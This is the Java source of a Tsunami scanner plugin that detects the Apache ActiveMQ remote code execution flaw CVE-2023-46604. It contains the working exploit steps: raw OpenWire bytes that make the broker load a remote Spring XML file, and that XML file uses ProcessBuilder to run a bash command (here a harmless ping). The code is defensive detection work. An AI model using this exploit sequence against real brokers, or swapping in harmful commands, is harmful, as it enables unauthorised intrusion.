/*
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202346604;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.net.HostAndPort;
import com.google.tsunami.common.data.NetworkEndpointUtils;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.*;
import org.apache.activemq.util.MarshallingSupport;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.net.Socket;
import java.time.Clock;
import java.time.Instant;
import java.util.Map;
import javax.inject.Inject;
import javax.inject.Qualifier;
import javax.net.SocketFactory;

/** A {@link VulnDetector} that detects the CVE-2023-46604 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Apache ActiveMQ RCE CVE-2023-46604 Detector",
    version = "0.1",
    description = Cve202346604Detector.VULN_DESCRIPTION,
    author = "hh-hunter",
    bootstrapModule = Cve202346604DetectorBootstrapModule.class)
public final class Cve202346604Detector implements VulnDetector {

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "Apache ActiveMQ is vulnerable to Remote Code Execution.The vulnerability may allow a remote attacker with "
          + "network access to a broker to run arbitrary shell commands by manipulating serialized class types in "
          + "the OpenWire protocol to cause the broker to instantiate any class on the classpath. ";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final String[] SECURE_VERSION = {"5.15.16", "5.16.7", "5.17.6", "5.18.3"};
  private static final String PAYLOAD_XML =
      "<beans xmlns=\"http://www.springframework.org/schema/beans\" "
          + "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
          + "xsi:schemaLocation=\"http://www.springframework.org/schema/beans "
          + "http://www.springframework.org/schema/beans/spring-beans.xsd\">\n"
          + "  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n"
          + "    <constructor-arg>\n"
          + "      <list>\n"
          + "        <value>bash</value>\n"
          + "        <value>-c</value>\n"
          + "        <value><![CDATA[ping -c 5 REPLACE_FLAG]]></value>\n"
          + "      </list>\n"
          + "    </constructor-arg>\n"
          + "  </bean>\n"
          + "</beans>";

  private final Clock utcClock;

  private final SocketFactory socketFactory;

  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve202346604Detector(
      @UtcClock Clock utcClock,
      @SocketFactoryInstance SocketFactory socketFactory,
      PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.socketFactory = checkNotNull(socketFactory);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-46604 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isTransportProtocolTcp)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isTransportProtocolTcp(NetworkService networkService) {
    return TransportProtocol.TCP.equals(networkService.getTransportProtocol());
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    HostAndPort hp = NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
            .build();

    Payload payload = this.payloadGenerator.generate(config);
    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
      return false;
    }
    try {
      String currentVersion = getServerVersion(hp.getHost(), hp.getPort());
      if (checkVersionIsSecure(currentVersion)) {
        logger.atInfo().log(
            "Target Version %s %s is not vulnerable", currentVersion, networkService);
        return false;
      }
      Socket socket = socketFactory.createSocket(hp.getHost(), hp.getPort());
      OutputStream os = socket.getOutputStream();
      DataOutputStream dos = new DataOutputStream(os);
      dos.writeInt(0);
      dos.writeByte(31);
      dos.writeInt(0);
      dos.writeBoolean(false);
      dos.writeInt(0);
      dos.writeBoolean(true);
      dos.writeBoolean(true);
      dos.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
      dos.writeBoolean(true);
      dos.writeUTF(String.format("http://%s/tsunami_scanner.xml", payload.getPayload()));

      dos.close();
      os.close();
      socket.close();

      if (payload.checkIfExecuted()) {
        logger.atInfo().log("Target %s is vulnerable", networkService);
        return true;
      } else {
        logger.atInfo().log("Target %s is not vulnerable", networkService);
        return false;
      }
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }
    return false;
  }

  public static boolean checkVersionIsSecure(String currentVersion) {
    String[] parts1 = currentVersion.split("\\.");
    for (String secureVersion : SECURE_VERSION) {
      String[] parts2 = secureVersion.split("\\.");
      if (parts1[0].equals(parts2[0])) {
        if (parts1[1].equals(parts2[1])) {
          return Integer.parseInt(parts1[2]) >= Integer.parseInt(parts2[2]);
        }
      }
    }
    // If no secure minor version matches the current version, it's considered not secure by
    // default.
    return false;
  }

  private String getServerVersion(String serverAddress, int serverPort) {
    try {
      Socket socket = socketFactory.createSocket(serverAddress, serverPort);
      DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
      byte[] header = new byte[22];
      dataInputStream.readFully(header);
      Map<String, Object> maps = MarshallingSupport.unmarshalPrimitiveMap(dataInputStream, 4096);
      return maps.get("ProviderVersion").toString();
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Get Target Version Failed");
      return "";
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2023_46604"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2023-46604 Apache ActiveMQ RCE")
                .setRecommendation("Upgrade to version 5.15.16, 5.16.7, 5.17.6, or 5.18.3")
                .setDescription(VULN_DESCRIPTION))
        .build();
  }

  @Qualifier
  @Retention(RetentionPolicy.RUNTIME)
  @interface SocketFactoryInstance {}
}
